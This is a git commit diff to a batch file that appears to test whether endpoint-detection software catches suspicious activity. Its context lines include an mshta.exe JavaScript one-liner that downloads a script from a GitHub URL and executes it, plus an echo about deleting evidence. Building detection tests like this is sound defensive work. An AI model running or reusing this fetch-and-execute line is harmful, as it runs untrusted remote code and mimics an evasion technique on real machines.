c1509e4ba594bbfde3ec5e7b803b0bfdead4a190
harasay <114565656+harasay@users.noreply.github.com>
2023-03-16 17:21:56 +0900

    Update edrtest2-POV.bat

--- edrtest2-POV.bat
+++ edrtest2-POV.bat
@@ -1,4 +1,4 @@
-#echo EDR test powershell activity
+echo EDR test powershell activity
 mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest2-POV.bat")).Exec();close()
 timeout 5
 echo EDR test delete evidence
